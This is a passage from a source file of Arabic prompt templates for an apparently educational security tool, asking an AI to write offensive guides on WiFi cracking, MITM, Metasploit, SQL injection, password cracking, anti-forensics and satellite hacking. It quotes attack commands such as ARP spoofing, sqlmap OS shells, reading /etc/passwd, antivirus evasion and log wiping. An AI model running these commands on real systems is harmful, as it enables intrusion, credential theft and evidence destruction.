    prompt: `أنت خبير أمن سيبراني تعليمي. اشرح بالتفصيل التهديدات الكمية للأمن السيبراني للموضوع:\n\n{input}\n\nاشرح:\n1. أساسيات الحوسبة الكمية: qubits، superposition، entanglement، quantum gates\n2. خوارزمية Shor: كيف تكسر RSA وECC بكفاءة متعددة الحدود\n3. خوارزمية Grover: تسريع كسر التشفير المتماثل (تقليل فعلي لطول المفتاح إلى النصف)\n4. تهديد Q-Day: متى ستصبح الحواسيب الكمية خطرة فعلاً؟\n5. استراتيجية Harvest Now, Decrypt Later: جمع البيانات الآن لفكها لاحقاً\n6. التشفير ما بعد الكمي (PQC):\n   - NIST PQC standards: CRYSTALS-Kyber، CRYSTALS-Dilithium، SPHINCS+\n   - خوارزميات مقاومة للكم: lattice-based، hash-based، code-based\n7. خطوات التحضير للمؤسسات: crypto agility، inventory التشفير الحالي، migration path\n8. الجدول الزمني المقدر للتهديد الكمي\nاكتب بلغة عربية احترافية.`,
    defaultInput: "تهديدات الحوسبة الكمية للتشفير والأمن السيبراني",
    inputLabel: "الموضوع",
    rows: 3,
  },
  "Bio-Digital Threats": {
    prompt: `أنت خبير أمن سيبراني تعليمي. اشرح بالتفصيل تهديدات الاندماج الرقمي البيولوجي للموضوع:\n\n{input}\n\nاشرح:\n1. تعريف الهجمات الرقمية-البيولوجية وسياقها الناشئ\n2. اختراق الأجهزة الطبية المتصلة:\n   - أجهزة ضبط النبض وأجهزة الأنسولين (ثغرات Abbott، Medtronic)\n   - مخاطر الهجمات على المستشفيات (ransomware في ICU)\n   - معايير IEC 62443 لأمن الأجهزة الطبية\n3. تهديدات المحيط الحيوي-الرقمي:\n   - DNA synthesis attacks: كود خبيث مخفي في تسلسل DNA\n   - Biometric spoofing: تجاوز بصمة الإصبع والتعرف على الوجه والصوت\n   - Neural interface hacking: مخاطر Neuralink وما شابهه\n4. الرقائق القابلة للزرع: ثغرات RFID/NFC في الزرعات البشرية\n5. التلاعب بالبيانات البيولوجية: قواعد بيانات الجينوم وخصوصية DNA\n6. الدفاعات: تشفير بيانات الأجهزة الطبية، مراقبة الشبكات الطبية، تنظيم FDA/CE\n7. الإطار الأخلاقي والقانوني للأمن الحيوي الرقمي\nاكتب بلغة عربية احترافية.`,
    defaultInput: "تهديدات الاندماج بين التكنولوجيا الرقمية والبيولوجيا البشرية",
    inputLabel: "الموضوع",
    rows: 3,
  },
  "AI Model Poisoning": {
    prompt: `أنت خبير أمن سيبراني تعليمي. اشرح بالتفصيل هجمات تسميم نماذج الذكاء الاصطناعي للموضوع:\n\n{input}\n\nاشرح:\n1. تعريف AI/ML Security وسطح الهجوم الفريد\n2. هجمات تسميم البيانات (Data Poisoning):\n   - تلويث بيانات التدريب لإفساد سلوك النموذج\n   - Label flipping attacks: تغيير تصنيفات بيانات التدريب\n   - هجمات الباب الخلفي (Backdoor Attacks): trigger-based behavior\n3. هجمات الخصم (Adversarial Examples):\n   - FGSM، PGD، Carlini-Wagner attacks\n   - تلاعب بالصور يخدع نماذج التصنيف بثقة 99%\n   - Physical world attacks: ملصقات تخدع كاميرات السيارات الذاتية\n4. هجمات استخراج النموذج (Model Extraction): نسخ نموذج تجاري بالاستعلام عنه\n5. هجمات الاستنتاج العكسي (Model Inversion): استرداد بيانات التدريب السرية\n6. هجمات على LLMs: prompt injection، jailbreaking، training data extraction\n7. دفاعات AI: adversarial training، differential privacy، model watermarking، red-teaming\n8. أطر حوكمة AI: NIST AI RMF، EU AI Act\nاكتب بلغة عربية احترافية.`,
    defaultInput: "تسميم نماذج الذكاء الاصطناعي والهجمات الخصمية",
    inputLabel: "الموضوع",
    rows: 3,
  },
  "Kali WiFi Hacking": {
    prompt: `أنت خبير أمن سيبراني تعليمي. قدم دليلاً تعليمياً شاملاً لاختراق الشبكات اللاسلكية باستخدام Kali Linux للموضوع:\n\n{input}\n\nاشرح:\n1. المفاهيم الأساسية: 802.11 protocols، WPA2-PSK، WPA3-SAE، 4-way handshake، PMKID\n2. أدوات Kali المطلوبة: aircrack-ng suite، hcxdumptool، hcxpcapngtool، hashcat، hostapd\n3. إعداد البيئة:\n   - بطاقة شبكة تدعم monitor mode وpacket injection\n   - تفعيل monitor mode: airmon-ng check kill && airmon-ng start wlan0\n4. هجوم WPA2 - التقاط الـ Handshake:\n   airodump-ng wlan0mon → تحديد الهدف → التقاط handshake\n   aireplay-ng -0 للإجبار على إعادة الاتصال\n5. هجوم PMKID (بدون عميل):\n   hcxdumptool -o capture.pcapng → hcxpcapngtool → hashcat -m 22000\n6. كسر الـ handshake بـ hashcat:\n   GPU wordlist + rules: rockyou.txt، best64.rule، d3adhob0.rule\n   Hybrid attacks، mask attacks\n7. هجوم Evil Twin + Captive Portal:\n   hostapd + dnsmasq + PHP portal لاستخراج كلمة المرور\n8. هجمات WPA3 DragonBlood (للتوعية)\n9. الاعتبارات القانونية: الاختراق المصرح به فقط\nاكتب بلغة عربية احترافية مع الأوامر الفعلية.`,
    defaultInput: "اختراق شبكات WPA2/WPA3 باستخدام Kali Linux",
    inputLabel: "الموضوع أو الاستفسار",
    rows: 3,
  },
  "Kali MITM Attack": {
    prompt: `أنت خبير أمن سيبراني تعليمي. قدم دليلاً تعليمياً شاملاً لهجمات Man-in-the-Middle باستخدام Kali Linux للموضوع:\n\n{input}\n\nاشرح:\n1. مفهوم MITM: كيف يتموضع المهاجم بين الضحية والـ Gateway\n2. ARP Poisoning (ARP Spoofing):\n   - كيف يعمل: إرسال ARP replies مزيفة لتسميم جداول ARP\n   - الأدوات: arpspoof، Bettercap، Ettercap\n   - الأوامر: arpspoof -i eth0 -t {victim_ip} {gateway_ip}\n3. Bettercap - السكين السويسري لـ MITM:\n   - التثبيت والإعداد\n   - modules: arp.spoof، net.sniff، http.proxy، https.proxy\n   - caplets للأتمتة\n4. SSL Stripping (تجريد HTTPS):\n   - كيف يحول HTTPS إلى HTTP\n   - أداة SSLstrip و Bettercap https.proxy\n   - تجاوز HSTS\n5. Credential Capture: التقاط كلمات المرور من HTTP/FTP/POP3\n6. DNS Spoofing: إعادة توجيه الضحية لصفحات مزيفة\n7. SSL Certificate Spoofing: إنشاء شهادات مزيفة\n8. الكشف والحماية: Dynamic ARP Inspection، HTTPS Everywhere، VPN\nاكتب بلغة عربية مع الأوامر الفعلية.`,
    defaultInput: "هجمات MITM وARP Spoofing بـ Kali Linux",
    inputLabel: "الموضوع",
    rows: 3,
  },
  "Kali Metasploit": {
    prompt: `أنت خبير أمن سيبراني تعليمي. قدم دليلاً تعليمياً شاملاً لإطار Metasploit Framework للموضوع:\n\n{input}\n\nاشرح:\n1. مقدمة Metasploit: التاريخ، البنية، msfconsole، msfvenom\n2. هيكل الإطار:\n   - Modules: exploits، payloads، auxiliaries، post، encoders، nops\n   - Database: PostgreSQL integration، workspace management\n3. الاستخدام الأساسي:\n   - msfconsole → search → use → show options → set → run/exploit\n   - db_nmap لاستيراد نتائج nmap\n4. أنواع الـ Payloads:\n   - Singles vs Stagers vs Stages\n   - Meterpreter: الـ payload الأقوى — في الذاكرة، مشفر، قابل للتوسيع\n   - Reverse TCP vs Bind TCP vs HTTPS\n5. Meterpreter Commands:\n   - sysinfo، getuid، getsystem (privesc)، hashdump\n   - upload، download، shell، execute\n   - migrate (انتقال لعملية أخرى)\n6. Post-Exploitation Modules:\n   - Credential harvesting: post/multi/gather/\n   - Persistence: post/windows/manage/persistence\n   - Pivoting: route add، portfwd\n7. msfvenom لتوليد الـ Payloads:\n   - EXE، APK، Python، PowerShell، PHP payloads\n   - Encoding لتجاوز الـ AV\n8. الاعتبارات القانونية والأخلاقية\nاكتب بلغة عربية مع الأوامر الفعلية.`,
    defaultInput: "Metasploit Framework من البداية للاحتراف",
    inputLabel: "الموضوع",
    rows: 3,
  },
  "Kali SQLi Guide": {
    prompt: `أنت خبير أمن سيبراني تعليمي. قدم دليلاً تعليمياً شاملاً لحقن SQL باستخدام أدوات Kali Linux للموضوع:\n\n{input}\n\nاشرح:\n1. مفهوم SQL Injection وأنواعه:\n   - Error-based، Union-based، Blind Boolean، Time-based Blind، Out-of-band\n2. اكتشاف نقاط الحقن يدوياً:\n   - اختبار المعاملات: '، \"، )، ، --، #، ;--\n   - تحليل الاستجابات: رسائل الخطأ، تغير المحتوى، التأخير\n3. sqlmap - أداة الحقن الآلية:\n   - التثبيت والاستخدام الأساسي: sqlmap -u \"URL\" --dbs\n   - استخراج البيانات: --tables، --columns، --dump\n   - تجاوز WAF: --tamper scripts\n   - OS shell: --os-shell\n   - Upload web shell: --file-write\n4. الحقن اليدوي (UNION-based):\n   - تحديد عدد الأعمدة: ORDER BY N--\n   - UNION SELECT للاستخراج\n   - قراءة الملفات: LOAD_FILE('/etc/passwd')\n5. Blind SQL Injection:\n   - Boolean: AND 1=1 vs AND 1=2\n   - Time-based: AND SLEEP(5)\n   - استخراج البيانات حرفاً بحرف\n6. تجاوز الحمايات:\n   - WAF bypass techniques\n   - Encoding: URL، Base64، Unicode\n   - Comments: /**/ ، /*!50000SELECT*/\n7. التصعيد: من قاعدة بيانات إلى OS shell (MySQL UDF، MSSQL xp_cmdshell)\n8. الحماية: Prepared Statements، Input Validation، WAF، Least Privilege\nاكتب بلغة عربية مع الأوامر والأمثلة الفعلية.`,
    defaultInput: "حقن SQL باستخدام sqlmap وتقنيات يدوية",
    inputLabel: "الموضوع",
    rows: 3,
  },

  // ── Advanced Arsenal Prompts ──────────────────────────────────────────
  "BlackArch Arsenal": {
    prompt: `أنت خبير أمن سيبراني تعليمي متخصص في BlackArch Linux. قدم دليلاً شاملاً للموضوع:\n\n{input}\n\nاشرح:\n1. نظرة عامة على BlackArch Linux:\n   - الفرق عن Kali: +2800 أداة، Arch-based، rolling release، مستودع blackarch\n   - التثبيت: full ISO، slim ISO، أو إضافة blackarch repo على Arch Linux\n   - pacman -S blackarch-networking، blackarch-exploitation، blackarch-wireless\n2. تصنيف الأدوات الرئيسية (Categories):\n   - blackarch-recon: amass، subfinder، fierce، theHarvester، shodan-cli، maltego\n   - blackarch-exploitation: metasploit، exploit-db، shellnoob، pwndbg\n   - blackarch-wireless: aircrack-ng، bettercap، wifite2، kismet، hostapd-wpe\n   - blackarch-reversing: radare2، ghidra، binary ninja، gdb-peda، pwndbg\n   - blackarch-crypto: hashcat، john، ophcrack، fcrackzip\n   - blackarch-fuzzer: AFL++، boofuzz، wfuzz، ffuf، sqlmap\n   - blackarch-automobile: canutils، kayak، openxc، canalyze\n   - blackarch-radio: gnuradio، gqrx، rtl-sdr، hackrf، inspectrum، urh\n   - blackarch-satellite: gr-satellites، leosatellites، satdump\n   - blackarch-stego: steghide، stegseek، zsteg، outguess\n3. سلاسل هجوم متعددة الأدوات (Multi-Tool Attack Chains):\n   - Web App: amass → nuclei → sqlmap → metasploit → chisel (pivoting)\n   - Wireless: kismet → aircrack-ng → hashcat → evil-twin via hostapd-wpe\n   - Internal Network: nmap → crackmapexec → bloodhound → impacket → mimikatz\n   - Social Engineering: gophish → beef-xss → msfvenom payload → meterpreter\n4. BlackArch في الـ CTF: أدوات forensics، crypto، pwn، reverse\n5. تحديث وإدارة الأدوات:\n   pacman -Syu && pacman -S blackarch\n6. نصائح للأداء: RAM disk، SSD، GPU passthrough في VMs\n7. الاعتبارات القانونية: بيئات مخصصة فقط، authorized testing\nاكتب بلغة عربية احترافية مع الأوامر الفعلية.`,
    defaultInput: "ترسانة BlackArch الكاملة وسلاسل الهجوم المتعددة",
    inputLabel: "الموضوع أو الاستفسار",
    rows: 3,
  },

  "SDR & RF Hacking": {
    prompt: `أنت خبير أمن سيبراني تعليمي متخصص في Software Defined Radio وهجمات الترددات الراديوية. قدم دليلاً شاملاً للموضوع:\n\n{input}\n\nاشرح:\n1. مقدمة SDR:\n   - ما هو Software Defined Radio: الراديو المُعرَّف بالبرمجيات\n   - الأجهزة: RTL-SDR (25$)، HackRF One، YARD Stick One، LimeSDR، BladeRF\n   - البرامج: GNU Radio، GQRX، SDR#، DragonOS، Universal Radio Hacker (URH)\n2. DragonOS:\n   - توزيعة Linux مخصصة لـ SDR والـ RF security\n   - الأدوات المدمجة: GNU Radio، OpenBTS، OsmocomBB، gr-gsm، kalibrate-rtl\n   - تشغيل DragonOS على Raspberry Pi 4 أو x86\n3. هجمات GSM/LTE:\n   - التقاط حزم GSM: gr-gsm + Wireshark\n   - kalibrate-rtl: اكتشاف أبراج GSM المجاورة وقياس الانجراف\n   - gr-gsm للاستماع على قنوات GSM غير المشفرة (A5/0)\n   - تحليل حركة 2G: TMSI، IMSI، paging messages\n4. GPS Spoofing:\n   - كيف تعمل إشارات GPS: L1 C/A (1575.42 MHz)، timing signals\n   - GPS Spoofing بـ HackRF + GPS-SDR-SIM\n   - توليد إشارة GPS مزيفة لتغيير موقع جهاز\n   - الكشف عن GPS spoofing: multi-antenna، clock monitoring\n5. ADS-B وتتبع الطائرات:\n   - ADS-B: Automatic Dependent Surveillance–Broadcast على 1090 MHz\n   - dump1090 + RTL-SDR لاستقبال بيانات الطائرات\n   - Virtual Radar Server لعرض خريطة الطيران\n   - هجمات ADS-B injection: إدخال طائرات وهمية\n6. TPMS (ضغط إطارات السيارات):\n   - تتبع السيارات عبر إشارات TPMS (315/433 MHz)\n   - تحليل الإشارات بـ URH (Universal Radio Hacker)\n7. Satellite SDR:\n   - استقبال صور NOAA weather satellites (137 MHz)\n   - فك تشفير Inmarsat STD-C، ACARS من الطائرات\n   - gr-satellites لأقمار CubeSats\n8. هجمات Replay: التقاط وإعادة إرسال إشارات remote keys، garage doors\n9. الإطار القانوني: قوانين الاتصالات، حظر الإرسال غير المرخص\nاكتب بلغة عربية احترافية مع الأوامر والترددات الفعلية.`,
    defaultInput: "اختراق الترددات الراديوية باستخدام SDR وDragonOS",
    inputLabel: "الموضوع أو الاستفسار",
    rows: 3,
  },

  "Whonix / QubesOS OPSEC": {
    prompt: `أنت خبير أمن سيبراني تعليمي متخصص في الأمن التشغيلي وإخفاء الهوية. قدم دليلاً شاملاً للموضوع:\n\n{input}\n\nاشرح:\n1. مقدمة في OpSec (Operational Security):\n   - تعريف OpSec وأهميته للباحثين الأمنيين والصحفيين والناشطين\n   - نموذج تهديد (Threat Model): من هو عدوك؟ ماذا تحاول حماية؟\n2. Qubes OS - نظام الأمن بالعزل:\n   - المفهوم: hypervisor-based isolation، كل تطبيق في VM منفصل\n   - Qubes Domains: Work، Personal، Untrusted، Vault (مفصولة تماماً)\n   - dom0: النواة الآمنة التي تتحكم بكل الـ VMs\n   - DisposableVMs: VMs مؤقتة تُدمر بعد الاستخدام\n   - التثبيت والإعداد: متطلبات الـ hardware، قسم التشفير\n3. Whonix داخل Qubes:\n   - Whonix-Gateway: يوجّه كل الاتصالات عبر Tor\n   - Whonix-Workstation: بيئة العمل المعزولة كلياً عن الإنترنت المباشر\n   - Stream Isolation: تطبيق مختلف → Tor circuit مختلف\n   - لماذا Qubes+Whonix أقوى من Tails وحده\n4. Tor Network المتقدم:\n   - كيف يعمل Tor: onion routing، 3 relays، Exit Node\n   - Tor Bridges: obfs4، meek، Snowflake لتجاوز الحجب\n   - .onion v3 services: إنشاء hidden service خاص\n   - Guard nodes: أهمية الـ Entry Guard وكيفية تغييره\n5. تسريبات الهوية المحتملة (Leak Vectors):\n   - DNS leaks: كيف تحدث وكيف تمنعها\n   - WebRTC leaks في المتصفح\n   - Timezone، Language، Screen Resolution fingerprinting\n   - JavaScript Canvas fingerprinting\n   - Tor Browser Security Level: Safest mode\n6. Live OS للمهام الحساسة:\n   - Tails OS: amnesic, RAM-only, نسيان كل شيء عند الإيقاف\n   - Tails مع Persistent Storage المشفر\n   - مقارنة: Qubes+Whonix vs Tails لحالات الاستخدام المختلفة\n7. التشفير الكامل:\n   - LUKS full-disk encryption عند التثبيت\n   - VeraCrypt للحاويات المشفرة، Plausible Deniability\n   - GPG للتواصل المشفر: توليد مفاتيح، تبادل المفاتيح، WKD\n   - Signal Protocol: الأفضل للمراسلة الآمنة وسبب ذلك\n8. Hardware OpSec:\n   - Air-gapped machines: قطع الاتصال الكامل بالإنترنت\n   - Faraday cages للحماية من TEMPEST\n   - استخدام أجهزة مجهولة المصدر، No IME (Intel ME disabled)\n   - USB Rubber Ducky والـ BadUSB: لماذا لا تعير USBs أجنبية\n9. أفضل الممارسات التشغيلية:\n   - فصل الهويات الرقمية كلياً\n   - لا استخدام Wi-Fi الشخصي، استخدام MAC address randomization\n   - خطة الطوارئ: Emergency shutdown، panic button\nاكتب بلغة عربية احترافية مع خطوات عملية.`,
    defaultInput: "إعداد Whonix + QubesOS للإخفاء التام والأمن التشغيلي",
    inputLabel: "الموضوع أو الاستفسار",
    rows: 3,
  },

  "GPU Brute Force": {
    prompt: `أنت خبير أمن سيبراني تعليمي متخصص في كسر كلمات المرور. قدم دليلاً شاملاً للموضوع:\n\n{input}\n\nاشرح:\n1. مقدمة في كسر كلمات المرور بـ GPU:\n   - لماذا GPU أسرع من CPU: آلاف النوى المتوازية، CUDA/OpenCL\n   - أسرع GPUs للكسر: RTX 4090 (300+ GH/s على MD5)، RTX 3090، A100\n   - Hashcat vs John the Ripper: المقارنة والاختيار\n2. hashcat - الدليل الشامل:\n   - التثبيت: hashcat على Kali، أهمية تعريفات GPU الصحيحة\n   - Benchmark: hashcat -b لاختبار سرعة GPU على كل algorithm\n   - أوضاع الهجوم (-a):\n     • -a 0: Wordlist (Dictionary attack)\n     • -a 1: Combinator attack\n     • -a 3: Brute-force / Mask attack\n     • -a 6: Wordlist + Mask hybrid\n     • -a 7: Mask + Wordlist hybrid\n3. أنواع الهاشات (-m) وسرعاتها:\n   - MD5 (-m 0): أسرع ~300 GH/s على RTX 4090\n   - NTLM (-m 1000): Windows passwords ~400 GH/s\n   - SHA-256 (-m 1400): ~15 GH/s\n   - bcrypt (-m 3200): بطيء جداً ~100 KH/s (مصمم للبطء)\n   - WPA2 PMKID (-m 22000): ~2 MH/s\n   - SHA-512crypt (-m 1800): ~3 MH/s\n   - Kerberoast (-m 13100): ~1.5 GH/s\n4. Wordlists الاحترافية:\n   - rockyou.txt: 14M كلمة مرور مسربة\n   - SecLists: مجموعة شاملة للأمن\n   - hashesorg: ملايين الهاشات المكسورة مسبقاً\n   - CrackStation: 1.5 مليار كلمة مرور\n   - Weakpass: قواعد بيانات ضخمة متخصصة\n5. Rules-Based Attacks (أقوى تقنية):\n   - best64.rule: أشهر 64 قاعدة تحويل\n   - d3adhob0.rule: قواعد متقدمة جداً\n   - OneRuleToRuleThemAll.rule: مشهور جداً في المجتمع\n   - أمثلة: password → P@ssw0rd، p4ssword، Password123!\n   - hashcat -a 0 -r rules/best64.rule hash.txt wordlist.txt\n6. Mask Attacks للبرت فورس الذكي:\n   - ?l=lowercase، ?u=uppercase، ?d=digit، ?s=special، ?a=all\n   - هجوم 8 أحرف أرقام وحروف: hashcat -a 3 -m 0 hash.txt ?a?a?a?a?a?a?a?a\n   - استخدام --increment لأطوال متزايدة\n7. Rainbow Tables:\n   - ما هي وكيف تعمل، مقارنة مع wordlist attacks\n   - RainbowCrack، rcracki_mt\n   - لماذا الـ salt يبطل Rainbow Tables\n8. Distributed Cracking:\n   - hashcat --brain للكسر الموزع\n   - hashcat في cloud: AWS G5 instances، Lambda Labs\n   - أدوات: hashtopolis لإدارة مزارع الكسر\n9. الحماية من Brute Force:\n   - استخدام bcrypt/Argon2/scrypt بدلاً من MD5/SHA\n   - Password stretching وكيف يبطئ الكسر\n   - Multi-Factor Authentication\nاكتب بلغة عربية احترافية مع الأوامر الفعلية والأرقام الحقيقية للسرعات.`,
    defaultInput: "كسر كلمات المرور بـ GPU وhashcat احترافياً",
    inputLabel: "الموضوع أو الاستفسار",
    rows: 3,
  },

  "Custom LFS Build": {
    prompt: `أنت خبير أمن سيبراني تعليمي متخصص في بناء أنظمة التشغيل المخصصة. قدم دليلاً شاملاً للموضوع:\n\n{input}\n\nاشرح:\n1. مقدمة في Linux From Scratch (LFS):\n   - ما هو LFS: بناء نظام Linux كامل من الكود المصدري\n   - لماذا يبني الأمنيون أنظمة مخصصة: إخفاء الهوية، تخفيض سطح الهجوم، أداء مخصص\n   - Beyond LFS (BLFS): إضافة حزم إضافية كالشبكات والـ GUI\n2. خطوات بناء LFS الأساسية:\n   - تحضير بيئة الـ Host (Debian/Ubuntu مستضيف)\n   - تقسيم القرص وتهيئته لـ LFS\n   - تحميل الـ sources: wget-list من lfs.org\n   - بناء toolchain مؤقت: binutils، gcc، glibc\n   - بناء النظام الأساسي: bash، coreutils، util-linux، shadow، sysklogd\n   - إعداد kernel: make menuconfig → make → make modules_install\n   - GRUB bootloader\n3. Hardened Kernel للأمن:\n   - تفعيل: CONFIG_SECURITY_SELINUX، CONFIG_STRICT_KERNEL_RWX\n   - تعطيل: modules غير ضرورية، bluetooth، firewire إن لم تحتج\n   - grsecurity patches: Kernel hardening إضافي\n   - sysctl.conf: kernel.dmesg_restrict، kernel.kptr_restrict\n4. بناء نظام Stealth (للاختراق المصرح به):\n   - تغيير kernel version string: لا تكشف عن نفسك\n   - إزالة /proc/version، /etc/os-release identifiers\n   - تخصيص MAC addresses، hostname عشوائي عند التشغيل\n   - initramfs مشفر مع LUKS\n5. Minimal Attack Surface OS:\n   - No unnecessary services (no SSH server افتراضياً)\n   - Mandatory Access Control: AppArmor أو SELinux\n   - Capabilities بدلاً من root: setcap بدلاً من sudo\n   - Read-only root filesystem\n6. Gentoo كبديل للـ LFS:\n   - USE flags لتجميع فقط ما تحتاجه\n   - hardened profile في Gentoo\n   - التوقيت: تجميع نظام Gentoo كامل (4-24 ساعة)\n7. NixOS للتكرارية والأمن:\n   - Declarative configuration: كل النظام في ملف واحد\n   - Immutable system: لا تغييرات عشوائية\n   - Rollback فوري لأي إصدار سابق\n8. توزيع النظام المخصص:\n   - إنشاء ISO قابل للتشغيل من نظامك\n   - live-build، mkosi، لأتمتة البناء\n   - توقيع الـ ISO بـ GPG\nاكتب بلغة عربية احترافية مع الخطوات والأوامر الفعلية.`,
    defaultInput: "بناء نظام تشغيل Linux مخصص للأمن السيبراني",
    inputLabel: "الموضوع أو الاستفسار",
    rows: 3,
  },

  "Zero-Day OS Systems": {
    prompt: `أنت خبير أمن سيبراني تعليمي. قدم دليلاً تعليمياً شاملاً لأنظمة التشغيل الهجومية التجارية والحكومية للموضوع:\n\n{input}\n\nاشرح:\n1. نظرة عامة على سوق الأسلحة السيبرانية التجارية:\n   - نشأة صناعة التجسس التجاري وقيمتها (مليارات الدولارات)\n   - الفرق بين أدوات pen-testing الشرعية والأسلحة السيبرانية\n   - تنظيم واسينار وقوائم الصادرات المزدوجة الاستخدام\n2. Pegasus (NSO Group):\n   - التاريخ والتطور: من 2011 إلى اليوم\n   - Zero-Click Exploits: الاستغلال بدون أي تفاعل من الضحية\n   - ثغرات مستخدمة: FORCEDENTRY (iOS iMessage)، CVE-2021-30860\n   - القدرات الكاملة: استخراج رسائل مشفرة، تشغيل كاميرا ومايك خفية\n   - كيف كُشف: Amnesty Tech، Citizen Lab، forensic analysis\n   - أداة MVT (Mobile Verification Toolkit) للكشف\n3. Predator (Cytrox/Intellexa):\n   - منافس Pegasus: المزايا والاستهداف\n   - ثغرات iOS وAndroid zero-click\n   - الدول المستخدِمة والضحايا الموثقون\n4. FinFisher / FinSpy:\n   - أداة اختراق ألمانية تباع للحكومات\n   - القدرات: Windows، Linux، macOS، iOS، Android\n   - كيف يعمل الـ Trojanized installer\n5. أسلحة NSA المسربة:\n   - مجموعة Shadow Brokers (2017): EternalBlue، DoublePulsar، EternalRomance\n   - كيف حوّل المجرمون EternalBlue إلى WannaCry و NotPetya\n   - Equation Group tools: أكثر مجموعات الـ APT تطوراً\n6. تقنيات Zero-Click الحديثة:\n   - Attack surface: iMessage، WhatsApp، FaceTime، AirDrop، Bluetooth\n   - Heap spray، JIT spraying، in-memory exploitation\n   - Sandbox escape chains: WebContent → Safari → kernel\n   - Kernel exploitation: PAC bypass، kASLR defeat\n7. الدفاع ضد هذه الأسلحة:\n   - Lockdown Mode في iOS 16+: تقليص سطح الهجوم جذرياً\n   - GrapheneOS لنظام Android المحصن\n   - Periodic device reset، air-gapped devices للحساسيات العالية\n8. التداعيات القانونية والأخلاقية:\n   - محاكمات NSO، قضايا Apple ضد مورد برامج التجسس\n   - Pegasus Project: صحفيون ومحققون دوليون\n   - مستقبل تنظيم هذه الصناعة\nاكتب بلغة عربية احترافية مع الحالات الموثقة.`,
    defaultInput: "أنظمة التشغيل الهجومية التجارية كـ Pegasus وزيرو كليك",
    inputLabel: "الموضوع أو الاستفسار",
    rows: 3,
  },

  "Anti-Forensics Suite": {
    prompt: `أنت خبير أمن سيبراني تعليمي. قدم دليلاً شاملاً لتقنيات مكافحة الجنائيات الرقمية (Anti-Forensics) للموضوع:\n\n{input}\n\nاشرح:\n1. مفهوم Anti-Forensics:\n   - تعريف: تقنيات تهدف إلى إعاقة التحقيقات الجنائية الرقمية\n   - الاستخدامات الدفاعية الشرعية: حماية الخصوصية، red team exercises\n   - نموذج تهديد: من يحقق وبأي أدوات؟\n2. Secure File Deletion (الحذف الآمن):\n   - لماذا أمر rm العادي لا يحذف البيانات فعلاً: filesystem journaling\n   - shred -u -z -n 35 filename (الكتابة فوق 35 مرة + zeros)\n   - wipe: أداة متخصصة للحذف الآمن\n   - secure-delete suite: srm، smem، sfill، sswap\n   - على SSD: المشكلة الخاصة بـ wear leveling وFTL، صعوبة الحذف الآمن\n   - الحل على SSD: ATA Secure Erase command\n3. Disk Wiping (مسح كامل):\n   - dd if=/dev/urandom of=/dev/sdX bs=4M (الكتابة عشوائية)\n   - nwipe: أداة متخصصة بمعايير DoD 5220.22-M، Gutmann\n   - DBAN (Darik's Boot and Nuke): للأقراص الصلبة الميتة\n4. RAM Wiping (مسح الذاكرة):\n   - Cold Boot Attacks: سرقة محتويات RAM بعد إيقاف الجهاز\n   - التخفيف: تشفير RAM، تعطيل Sleep/Hibernate، KeepAlive memory encryption\n   - Memory-only malware: BleachBit لمسح المساحة الحرة\n5. Metadata Scrubbing (إزالة البيانات الوصفية):\n   - ExifTool: إزالة metadata من الصور (GPS، كاميرا، تاريخ)\n     exiftool -all= -r /path/to/images/\n   - MAT2: إزالة metadata من PDF، Office، صور، صوت\n   - pdf-redact-tools: إزالة text layers المخفية من PDF\n   - Microsoft Word hidden metadata: author، revision history، comments مخفية\n6. Log Poisoning & Deletion:\n   - Linux logs: /var/log/auth.log، /var/log/syslog، /var/log/wtmp، ~/.bash_history\n   - تعطيل bash history: export HISTSIZE=0، HISTFILE=/dev/null\n   - Last login obfuscation، utmpdump لتعديل UTMP\n   - logrotate والـ syslog forwarding: التأثير على centralized logging\n   - Windows Event Log clearing: wevtutil cl Security (للـ authorized red teams)\n7. Filesystem Timestamp Manipulation:\n   - touch -t YYYYMMDDhhmm filename لتغيير timestamps\n   - Timestomping على Windows: Metasploit post module\n   - MAC times: Modify، Access، Change — كيف يستخدمها المحققون\n8. Steganography للإخفاء:\n   - steghide: إخفاء ملفات في صور JPEG\n   - stegseek: كسر steganography بـ wordlist بسرعة\n   - OpenStego، OutGuess كبدائل\n9. Encrypted Containers:\n   - VeraCrypt Hidden Volumes: Plausible Deniability الكامل\n   - كيف يعمل: حجم مشفر واحد بكلمتَي مرور — كلمة للمحتوى العادي، وأخرى للسري\n   - LUKS مع detached header\n10. Network Anti-Forensics:\n    - MAC Address Randomization: macchanger -r eth0\n    - VPN + Tor + Proxy chains\n    - Domain Fronting لإخفاء اتصالات C2\nاكتب بلغة عربية احترافية مع الأوامر الفعلية.`,
    defaultInput: "تقنيات مكافحة الجنائيات الرقمية والحذف الآمن",
    inputLabel: "الموضوع أو الاستفسار",
    rows: 3,
  },

  "Satellite Hacking": {
    prompt: `أنت خبير أمن سيبراني تعليمي متخصص في أمن الأقمار الصناعية. قدم دليلاً شاملاً للموضوع:\n\n{input}\n\nاشرح:\n1. مقدمة في أمن الفضاء السيبراني:\n   - أهمية الأقمار الصناعية: GPS، اتصالات، استطلاع، الطقس، الإنترنت\n   - سطح الهجوم: أرضي (ground stations)، الفضاء (satellite bus)، الرابط (communication link)\n   - حوادث حقيقية: AceMagic hijack، Viasat KA-SAT hack (أوكرانيا 2022)\n2. VSAT (Very Small Aperture Terminal):\n   - كيف تعمل شبكات VSAT: Hub → Satellite → Remote terminal\n   - اعتراض VSAT: SDR + طبق موجَّه، استقبال DVB-S2\n   - أداة iDirect، Hughes HN77000: ثغرات افتراضية في الإعدادات\n   - TunnelCrack وhttps://satel-sec.com بحوث VSAT الأمنية\n3. DVB-S/DVB-S2 Signal Analysis:\n   - DVB-S: معيار البث الفضائي\n   - استقبال DVB-S2 بـ RTL-SDR + LNB طبق\n   - أدوات: leandvb، gr-dvbs، TSDuck لتحليل MPEG-TS streams\n   - اكتشاف بيانات غير مشفرة في streams\n4. GPS Spoofing المتقدم:\n   - بنية نظام GPS: L1 (1575.42 MHz)، L2، L5\n   - GPS-SDR-SIM: توليد إشارات GPS مزيفة بـ HackRF\n   - تأثيرات عملية: تحويل مسار طائرات مسيّرة، خداع نظم الملاحة\n   - Meaconing: اعتراض وإعادة إرسال إشارة GPS لموقع آخر\n   - الكشف عن GPS Spoofing: RAIM، multi-constellation، clock monitoring\n5. Iridium Satellite Pager Interception:\n   - شبكة Iridium: 66 قمراً، تغطية قطبية كاملة\n   - Iridium pager على 1626 MHz: رسائل unencrypted تاريخياً\n   - gr-iridium: فك تشفير رسائل Iridium بـ RTL-SDR\n   - Iridium NEXT: التحسينات الأمنية\n6. ACARS (Aircraft Communications):\n   - ACARS على 129-137 MHz: رسائل طائرات بدون تشفير\n   - acarsdec + RTL-SDR لاستقبال وفك تشفير رسائل ACARS\n   - VDL Mode 2: نسخة 